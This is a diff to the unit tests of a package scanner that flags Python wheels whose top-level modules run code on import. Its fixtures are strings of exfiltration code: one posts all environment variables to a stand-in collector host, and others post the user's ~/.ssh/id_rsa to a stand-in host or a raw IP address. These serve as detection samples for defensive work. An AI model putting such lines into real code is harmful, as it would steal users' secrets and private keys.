@@ -28,9 +28,12 @@ WHEEL_META = {"x-1.0.dist-info/METADATA": "Name: x\nVersion: 1.0\n"}
 ENV_TO_COLLECTOR_PY = ("import os, json, urllib.request\n"
                        "urllib.request.urlopen('https://collector.invalid/c', "
                        "data=json.dumps(dict(os.environ)).encode())\n")
-SSH_KEY_TO_IP_PY = ("import os, requests\n"
-                    "requests.post('http://192.0.2.1/k', "
-                    "data=open(os.path.expanduser('~/.ssh/id_rsa')).read())\n")
+SSH_KEY_TO_HOST_PY = ("import os, requests\n"
+                      "requests.post('https://keys.invalid/k', "
+                      "data=open(os.path.expanduser('~/.ssh/id_rsa')).read())\n")
+# 0.1.8: sent to a raw IP address instead, it is CRITICAL (a credential file
+# and an IP address: tests/scanner/test_exfiltration_shapes.py)
+SSH_KEY_TO_IP_PY = SSH_KEY_TO_HOST_PY.replace("https://keys.invalid/k", "http://192.0.2.1/k")
 
 # Shapes of ordinary SDK and CLI code: none of these is a finding
 SDK_JS = {
@@ -135,12 +138,15 @@ class NpmImportTimeTests(unittest.TestCase):
 
 class WheelImportTimeTests(unittest.TestCase):
     def test_top_level_packages_and_modules(self):
-        for rel, text in (("x/__init__.py", ENV_TO_COLLECTOR_PY), ("evil.py", SSH_KEY_TO_IP_PY),
+        for rel, text in (("x/__init__.py", ENV_TO_COLLECTOR_PY), ("evil.py", SSH_KEY_TO_HOST_PY),
                           ("x-1.0.data/purelib/y/__init__.py", ENV_TO_COLLECTOR_PY)):
             with self.subTest(rel=rel):
                 res = scan_wheel({**WHEEL_META, rel: text})
                 self.assertEqual(import_risk(res), [(rel, "MAJOR")])
                 self.assertEqual(res["verdict"], "WARN", res["verdictReason"])
+        res = scan_wheel({**WHEEL_META, "evil.py": SSH_KEY_TO_IP_PY})
+        self.assertEqual(import_risk(res), [("evil.py", "CRITICAL")])
+        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
 
     def test_deeper_modules_are_not_checked(self):
         res = scan_wheel({**WHEEL_META, "x/__init__.py": "", "x/util.py": ENV_TO_COLLECTOR_PY})
